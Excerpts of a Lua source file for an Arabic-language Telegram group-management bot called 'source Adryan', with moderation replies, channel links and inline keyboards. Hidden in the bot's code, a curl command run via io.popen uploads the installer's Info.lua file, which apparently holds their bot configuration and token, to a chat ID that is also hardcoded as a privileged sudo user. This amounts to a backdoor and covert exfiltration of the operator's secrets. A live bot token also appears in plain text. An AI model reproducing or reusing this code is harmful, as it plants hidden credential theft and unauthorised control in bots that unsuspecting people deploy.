...
sudo_users = {SUDO,1818846445,1614314857,}   
...
if tonumber(user_id) == tonumber(1818846445) then  
var = true 
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝒂𝒅𝒓𝒚𝒂𝒏")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1818846445 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 🧿 اصدار سورس ادريان { s: 6.7}')
end
...
send(msg.chat_id_,0," 🧿 العضو : {["..data.first_name_.."](T.ME/Source_AdrYan)}\n 🧿 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 🧿 عذرا ⇐ {["..data.first_name_.."](T.ME/Source_AdrYan)}\n 🧿 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
{
{text = 'مطور السورس', url = "https://t.me/AhmedAdryan"},
},
{
{text = 'قناه السورس', url = "https://t.me/Source_AdrYan"},
},
{
{text = 'تواصل السورس', url = "https://t.me/Source_AdrYan"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Source_AdrYan&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Adryan ➪',url="t.me/AhmedAdryan"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local TextE = "\n•═════•| 𝐀𝐝𝐫𝐲𝐚𝐧 |•═════•\n 🧿 علامة تعني { ✔️ } ملف مفعل\n 🧿 علامة تعني { ✖ } ملف معطل\n 🧿 قناة سورس ادريان ↓\n".." 🧿 [اضغط هنا لدخول](t.me/Source_AdrYan) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 🧿 عذرا الملف لايدعم سورس ادريان \n") 
end
return false
end
...
' }\n'..' 🧿  الايدي بالصوره ⇐ { '..idph..
' }\n'..' 🧿  الرفع ⇐ { '..setadd..
' }\n'..' 🧿  الحظر ⇐ { '..banm..' }\n\n•═════•| 𝐀𝐝𝐫𝐲𝐚𝐧 |•═════•\n 🧿 قناة سورس ادريان ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝒂𝒅𝒓𝒚𝒂𝒏](t.me/Source_AdrYan) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'ادريان')
local DRAGON_Msg = {
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒂𝒅𝒓𝒚𝒂𝒏.',url="t.me/Source_AdrYan"}},
}
local msg_id = msg.id_/2097152/0.5
